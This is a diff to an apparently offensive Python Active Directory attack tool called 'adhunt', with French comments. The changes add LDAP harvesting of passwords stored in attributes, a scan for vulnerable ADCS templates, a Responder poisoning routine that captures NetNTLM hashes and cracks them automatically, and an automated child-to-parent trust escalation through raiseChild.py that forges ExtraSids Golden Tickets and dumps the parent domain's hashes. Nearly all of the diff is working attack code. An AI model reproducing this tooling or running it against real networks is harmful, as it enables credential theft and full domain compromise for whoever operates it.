@@ -140,6 +140,14 @@ class Board:
         dom = st.get("domain") or "?"
         dc = st.get("dc") or "?"
         _raw(f"{C.CY}{C.BD}  adhunt  ::  domaine {dom}  ::  DC {dc}{C.X}")
+        # bandeau de compteurs vivants : ce qui a ete trouve jusqu'ici
+        fs = st.get("findings") or []
+        nc = sum(1 for f in fs if f["sev"] == "CRIT")
+        nh = sum(1 for f in fs if f["sev"] == "HIGH")
+        _raw(f"{C.GR}  users {C.X}{len(st.get('user_rows') or [])}"
+             f"{C.GR}  hashes {C.X}{len(st.get('hash_rows') or [])}"
+             f"{C.GR}  creds {C.X}{len(st.get('creds') or [])}"
+             f"{C.GR}  vulns {C.R}{C.BD}{nc} CRIT{C.X}{C.GR}/{C.Y}{nh} HIGH{C.X}")
         if self.status:
             _raw(f"{C.GR}  > {self.status}{C.X}")
         sections = [
@@ -156,6 +164,14 @@ class Board:
                 continue
             _raw(f"\n{C.CY}{C.BD}  {title}  {C.GR}({len(rows)}){C.X}")
             show_table(headers, rows, color=col, cap=40)
+        # section vulnerabilites / chemins d'attaque (CRIT+HIGH+MED, les plus graves d'abord)
+        order = {"CRIT": 0, "HIGH": 1, "MED": 2}
+        vulns = sorted((f for f in fs if f["sev"] in order),
+                       key=lambda f: order[f["sev"]])
+        if vulns:
+            _raw(f"\n{C.R}{C.BD}  [ VULNERABILITES / CHEMINS D'ATTAQUE ]  {C.GR}({len(vulns)}){C.X}")
+            rows = [[f["sev"], f["title"], f.get("host") or "-"] for f in vulns[:25]]
+            show_table(["sev", "trouvaille", "hote"], rows, color=C.R, cap=64)
         _raw("")
 
 BOARD = Board()
@@ -1224,6 +1240,117 @@ def enum_dmsa_badsuccessor(conn, base, state, args, dc):
             add_finding(state, "CRIT", "BadSuccessor exploitable (OU inscriptible pour dMSA)",
                         "creation de dMSA -> heritage des privileges d'un compte cible", dc)
 
+# groupes AD a haut privilege -> on liste QUI est dedans (chemin direct vers DA)
+HIGH_GROUPS = ["Domain Admins", "Enterprise Admins", "Administrators", "Schema Admins",
+               "Account Operators", "Backup Operators", "Server Operators",
+               "Print Operators", "DnsAdmins", "Group Policy Creator Owners",
+               "Cert Publishers", "Remote Desktop Users", "Remote Management Users",
+               "Protected Users", "Distributed COM Users"]
+
+def enum_extra_ad(conn, base, state, args, dc):
+    """Detections AD supplementaires (lecture seule) : MachineAccountQuota,
+    mots de passe stockes dans des attributs, niveau fonctionnel, membres des
+    groupes privilegies, comptes a mot de passe qui n'expire jamais, sensibles."""
+    # 1) MachineAccountQuota : si > 0, un user lambda peut creer des machines -> RBCD / NoPac
+    try:
+        for e in ldap_search_all(conn, base, "(objectClass=domain)",
+                                 ["ms-DS-MachineAccountQuota", "msDS-Behavior-Version",
+                                  "lockoutThreshold", "minPwdLength"]):
+            maq = str(getattr(e, "ms-DS-MachineAccountQuota", "") or "")
+            if maq and maq.isdigit() and int(maq) > 0:
+                add_finding(state, "MED", f"MachineAccountQuota = {maq} (compte lambda cree des machines)",
+                            "abus RBCD / NoPac : un user peut ajouter un objet ordinateur", dc)
+                state["maq"] = int(maq)
+            lvl = str(getattr(e, "msDS-Behavior-Version", "") or "")
+            FL = {"7": "2016", "6": "2012R2", "5": "2012", "4": "2008R2", "3": "2008", "2": "2003"}
+            if lvl:
+                add_finding(state, "INFO", f"Niveau fonctionnel du domaine : Windows Server {FL.get(lvl, lvl)}",
+                            "", dc)
+    except Exception:
+        pass
+    # 2) mots de passe stockes en clair/reversibles dans des attributs LDAP
+    for attr in ("userPassword", "unixUserPassword", "unicodePwd", "ms-MCS-AdmPwd", "orclCommonAttribute"):
+        try:
+            for e in ldap_search_all(conn, base, f"({attr}=*)", ["sAMAccountName", attr]):
+                sam = str(getattr(e, "sAMAccountName", "") or "?")
+                val = getattr(e, attr, None)
+                if val:
+                    txt = val[0] if isinstance(val, (list, tuple)) and val else val
+                    try:
+                        txt = txt.decode() if isinstance(txt, (bytes, bytearray)) else str(txt)
+                    except Exception:
+                        txt = str(txt)
+                    add_finding(state, "CRIT", f"Mot de passe dans l'attribut {attr} : {sam}",
+                                f"{sam} -> {txt[:40]}", dc)
+                    if txt and len(txt) < 64:
+                        record_cred(state, sam, password=txt, src=f"ldap:{attr}")
+        except Exception:
+            pass
+    # 3) comptes PASSWORD_NEVER_EXPIRES + comptes sensibles-mais-pas-proteges
+    try:
+        for e in ldap_search_all(
+                conn, base,
+                "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))",
+                ["sAMAccountName"]):
+            sam = str(getattr(e, "sAMAccountName", "") or "")
+            if sam:
+                state.setdefault("never_expire", []).append(sam)
+    except Exception:
+        pass
+    if state.get("never_expire"):
+        add_finding(state, "INFO",
+                    f"PASSWORD_NEVER_EXPIRES : {len(state['never_expire'])} compte(s)",
+                    ", ".join(state["never_expire"][:12]), dc)
+    # 4) membres des groupes a haut privilege -> chemin direct vers Domain Admin
+    for grp in HIGH_GROUPS:
+        try:
+            res = ldap_search_all(conn, base, f"(&(objectClass=group)(cn={grp}))", ["member"])
+        except Exception:
+            continue
+        for e in res:
+            members = getattr(e, "member", None)
+            if not members:
+                continue
+            mlist = members if isinstance(members, (list, tuple)) else [members]
+            names = [re.sub(r"^CN=([^,]+),.*", r"\1", str(m)) for m in mlist]
+            names = [n for n in names if n]
+            if names:
+                sev = "HIGH" if grp in ("Domain Admins", "Enterprise Admins",
+                                        "Administrators", "Schema Admins") else "INFO"
+                add_finding(state, sev, f"Groupe {grp} : {len(names)} membre(s)",
+                            ", ".join(names[:15]), dc)
+                state.setdefault("group_members", {})[grp] = names
+
+def enum_adcs_esc(args, state, dc):
+    """Certipy find -vulnerable : templates ADCS vulnerables ESC1..ESC16 (lecture)."""
+    if not have("certipy") or not _gate_soft(args):
+        return
+    if not _once(state, "adcs_find"):
+        return
+    tgt_user = args.user or ""
+    cmd = ["certipy", "find", "-vulnerable", "-stdout", "-dc-ip", dc]
+    if args.domain:
+        cmd += ["-u", f"{args.user}@{args.domain}"] if args.user else []
+    if args.password:
+        cmd += ["-p", args.password]
+    elif args.nthash:
+        cmd += ["-hashes", nt_full(args.nthash)]
+    log(f"{C.GR}[i] certipy : recherche de templates ADCS vulnerables (ESC*)...{C.X}")
+    rc, out, _ = run_cmd(cmd, 240)
+    escs = sorted(set(re.findall(r"ESC\d+", out)))
+    if escs:
+        # extrait les noms de templates vulnerables si presents
+        tpls = re.findall(r"Template Name\s*:\s*(\S+)", out)
+        add_finding(state, "CRIT", f"ADCS vulnerable : {', '.join(escs)}",
+                    f"templates: {', '.join(sorted(set(tpls))[:6]) or '?'} -> "
+                    f"certipy req ... (voir loot/adcs_find.txt)", dc)
+        save_loot(args, "adcs_find.txt", out)
+        state["adcs_esc"] = escs
+
+def _gate_soft(args):
+    """Vrai si on a des creds (pour les enum authentifiees non destructives)."""
+    return bool(args.user and (args.password or args.nthash or args.kerberos))
+
 # ======================================================================
 # PHASE 3 : ENUM AUTHENTIFIEE (le coeur)
 # ======================================================================
@@ -1544,6 +1671,8 @@ def phase3_authenum(hosts, args, state):
                         read_laps(conn, base, state)
                         enum_trusts(conn, base, state)
                         enum_dmsa_badsuccessor(conn, base, state, args, dc)
+                        enum_extra_ad(conn, base, state, args, dc)   # MAQ/pwd-attrs/groupes priv
+                        enum_adcs_esc(args, state, dc)               # certipy find -vulnerable
                 except Exception as e:
                     log(f"{C.GR}    (dump LDAP partiel : {e}){C.X}")
             conn.unbind()
@@ -1663,6 +1792,62 @@ def mitm6_responder_hint(state):
     add_finding(state, "INFO", "IPv6 mitm6 -> relais LDAPS (sans cred, tres fiable en lab)",
                 "sudo mitm6 -d <domaine>  +  ntlmrelayx.py -6 -t ldaps://<DC> "
                 "-wh fakewpad.<domaine> --delegate-access")
+
+def run_responder(args, state):
+    """Lance Responder sur l'interface, capture les hashes NetNTLMv1/v2 (LLMNR/NBT-NS/mDNS
+    poisoning) pendant --responder-time secondes, puis les injecte dans le pipeline de crack.
+    Actif -> requiert Responder installe et (en general) les droits root."""
+    if not have("responder"):
+        add_finding(state, "INFO", "Responder absent : installe-le (apt install responder)",
+                    "puis relance avec --responder")
+        return
+    iface = args.iface or "eth0"
+    dur = max(20, int(args.responder_time or 90))
+    log(f"{C.CY}[i] Responder sur {iface} pendant {dur}s (poisoning LLMNR/NBT-NS/mDNS)...{C.X}")
+    BOARD.set_status(f"Responder en ecoute sur {iface} ({dur}s)")
+    # -w bannit WPAD, -d repond aux requetes DHCP, -v verbeux ; timeout dur pour ne pas bloquer
+    run_cmd(["responder", "-I", iface, "-wdv"], timeout=dur)
+    # Responder ecrit les hashes ici ; on ratisse tout ce qui ressemble a du NetNTLM
+    found = 0
+    logdirs = ["/usr/share/responder/logs", "/opt/responder/logs", "./logs",
+               os.path.expanduser("~/Responder/logs")]
+    seen = set()
+    for d in logdirs:
+        if not os.path.isdir(d):
+            continue
+        for fn in os.listdir(d):
+            if not fn.endswith(".txt"):
+                continue
+            try:
+                data = open(os.path.join(d, fn), encoding="utf-8", errors="ignore").read()
+            except Exception:
+                continue
+            for line in data.splitlines():
+                # NetNTLMv2 = user::domain:challenge:HMAC:blob  | NetNTLMv1 = user::host:lm:nt:chall
+                m = re.match(r"^([^:]+)::[^:]+:[0-9A-Fa-f]+:[0-9A-Fa-f]+:", line.strip())
+                if not m:
+                    continue
+                h = line.strip()
+                if h in seen:
+                    continue
+                seen.add(h)
+                user = m.group(1)
+                htype = "netntlmv1" if line.count(":") == 5 else "netntlmv2"
+                board_hash(state, user, htype)
+                add_finding(state, "HIGH", f"Hash {htype.upper()} capture (Responder) : {user}",
+                            "hashcat -m 5600 (v2) / -m 5500 (v1) -> crack", "")
+                found += 1
+                # ecrit dans un fichier consolidable par le cracker
+                mode = "5500" if htype == "netntlmv1" else "5600"
+                path = os.path.join(args.loot, f"responder_{mode}.txt")
+                with open(path, "a", encoding="utf-8") as f:
+                    f.write(h + "\n")
+                register_hashfile(state, htype, path)
+    if found:
+        log(f"{C.G}[+] Responder : {found} hash(es) NetNTLM capture(s) -> crack auto.{C.X}")
+        crack_hashes(args, state)
+    else:
+        log(f"{C.Y}[i] Responder : aucun hash capture (pas de trafic ? mauvaise interface ?).{C.X}")
 
 def cve_checks(args, state, dc, authed=False):
     """DETECTION SEULE (jamais d'auto-exploit, meme sous --exploit) via modules nxc :
@@ -1902,6 +2087,7 @@ def phase4_escalation(hosts, args, state):
 
     # 3) endgame : DCSync + coercion/relais + ADCS ESC -> PKINIT (gated --yes)
     dcsync_dump(args, state, dc)
+    attack_trust(args, state, dc)          # child -> parent (ExtraSids) si trust present
     if args.relay:
         coerce_relay(args, state, dc)
     adcs_request(args, state, dc)
@@ -2188,6 +2374,45 @@ def dcsync_dump(args, state, dc):
         extract_krbtgt(ntds, state)   # ferme la boucle : krbtgt -> commande Golden Ticket
     else:
         log(f"{C.GR}    -> DCSync refuse avec {args.user} (droits insuffisants).{C.X}")
+
+# ======================================================================
+# ATTAQUE DE TRUST : child -> parent (SID History / ExtraSids -> Golden Ticket)
+# ======================================================================
+def attack_trust(args, state, dc):
+    """Si un trust child->parent existe et qu'on est Domain Admin du child, automatise
+    l'escalade vers le parent (Enterprise Admin) via raiseChild.py (impacket) :
+    SID History / ExtraSids -> Golden Ticket -> secretsdump du parent. Gated --exploit+--yes."""
+    if not state.get("trusts"):
+        return
+    if not (args.exploit and args.yes) or args.safe:
+        add_finding(state, "HIGH", "Trust child->parent present : escalade possible vers le parent",
+                    "relance avec --exploit --yes pour tenter raiseChild.py (ExtraSids)", dc)
+        return
+    if not _once(state, "trust_attack"):
+        return
+    if not have("raiseChild.py"):
+        add_finding(state, "INFO", "raiseChild.py absent (impacket) pour l'attaque de trust",
+                    "manuel : raiseChild.py <child_domain>/<DA_user>:<pass>@<child_DC>", dc)
+        return
+    if not args.domain or not args.user:
+        return
+    tgt, extra = impacket_creds(args)
+    outp = os.path.join(args.loot, "raisechild.txt")
+    log(f"{C.R}{C.BD}[i] Attaque de trust : raiseChild child->parent (ExtraSids -> Golden Ticket)...{C.X}")
+    BOARD.set_status("Escalade de trust child -> parent (raiseChild)")
+    # raiseChild fait tout : trouve le parent, forge le ticket ExtraSids, dump le parent
+    rc, out, _ = run_cmd(["raiseChild.py", "-target-exec", dc, f"{tgt}@{dc}"] + extra, 600)
+    save_loot(args, "raisechild.txt", out)
+    # succes = il recrache des hashes du parent (Administrator du forest root)
+    m = re.search(r"Administrator:500:[0-9a-fA-F]{32}:([0-9a-fA-F]{32}):::", out)
+    if m or re.search(r"Enterprise Admin|Found user.*Administrator|krbtgt:", out):
+        nt = m.group(1) if m else None
+        add_finding(state, "CRIT", "Trust child->parent EXPLOITE : compromission du domaine parent",
+                    f"Administrator du forest root obtenu (voir {outp})", dc)
+        if nt:
+            add_cred_hash(state, "Administrator@parent", nt, src="raiseChild")
+    else:
+        log(f"{C.GR}    -> raiseChild n'a pas abouti (pas DA du child ? pas de trust exploitable ?).{C.X}")
 
 # ======================================================================
 # COERCION + NTLM RELAY (PetitPotam / Coercer -> ntlmrelayx)
@@ -2665,10 +2890,10 @@ def intro_animation():
 
 def detect_env():
     ext = [t for t in ("nxc", "netexec", "crackmapexec", "nmap", "kerbrute",
-                        "bloodhound-python", "certipy", "ldapsearch",
-                        "GetNPUsers.py", "GetUserSPNs.py", "secretsdump.py",
-                        "Get-GPPPassword.py", "GetLAPSPassword.py", "dacledit.py",
-                        "targetedKerberoast.py", "badsuccessor.py", "rbcd.py",
+                        "bloodhound-python", "certipy", "ldapsearch", "responder",
+                        "GetNPUsers.py", "GetUserSPNs.py", "secretsdump.py", "raiseChild.py",
+                        "Get-GPPPassword.py", "GetLAPSPassword.py", "dacledit.py", "ntlmrelayx.py",
+                        "targetedKerberoast.py", "badsuccessor.py", "rbcd.py", "mitm6",
                         "enum4linux-ng", "hashcat", "john") if have(t)]
     libs = [l for l in ("ldap3", "impacket") if have_lib(l)]
     return ext, libs
@@ -2690,8 +2915,11 @@ def main():
  Avec un hash NTLM (pass-the-hash) :
     python adhunt.py 10.10.10.10 -d corp.local -u jdoe -H <nthash>
 
- + ESCALADE offensive (DCSync/ADCS/RBCD/DACL/disk) + boucle jusqu'au DA :
-    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Pass1' --exploit --loop
+ + ESCALADE offensive (DCSync/ADCS/RBCD/DACL/disk/TRUST) + boucle jusqu'au DA :
+    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Pass1' --exploit --loop --yes
+
+ Poisoning LLMNR/NBT-NS (Responder) -> capture + crack des hashes NetNTLM :
+    sudo python adhunt.py 10.10.10.10 -d corp.local --responder --iface eth0
 
  Options : --spray (password spray, opt-in), --safe (lecture seule),
            --verbose (montre le detail a l'ecran), -o (dossier de sortie).
@@ -2715,6 +2943,12 @@ def main():
                    help="Boucle : re-enum auth a chaque nouveau cred trouve/cracke (jusqu'au DA)")
     p.add_argument("--relay", action="store_true",
                    help="Tenter coercion + ntlmrelayx (actif, requiert --yes + --lhost)")
+    p.add_argument("--responder", action="store_true",
+                   help="Lance Responder (LLMNR/NBT-NS/mDNS poisoning), capture les hashes NetNTLM "
+                        "et les crack (actif, requiert root + Responder installe)")
+    p.add_argument("--iface", help="Interface reseau pour Responder/mitm6 (defaut eth0)")
+    p.add_argument("--responder-time", type=int, default=90,
+                   help="Duree d'ecoute Responder en secondes (defaut 90)")
     p.add_argument("--lhost", help="IP de l'attaquant (pour le relais NTLM)")
     p.add_argument("--userlist", help="Liste d'utilisateurs a tester (seed phase 1)")
     p.add_argument("--wordlist", help="Wordlist pour le crack auto (defaut: rockyou si present)")
@@ -2767,6 +3001,10 @@ def main():
     hosts = confirm_services(targets, args, state)
     state["hosts"] = hosts
     state["domain"] = args.domain
+
+    # RESPONDER : poisoning LLMNR/NBT-NS (opt-in, actif) -> hashes NetNTLM -> crack
+    if args.responder and not args.safe:
+        run_responder(args, state)
 
     # ENUMERATION NON-AUTH (toujours : users via RID/kerbrute, AS-REP guest, roast+crack)
     phase1_unauth(hosts, args, state)
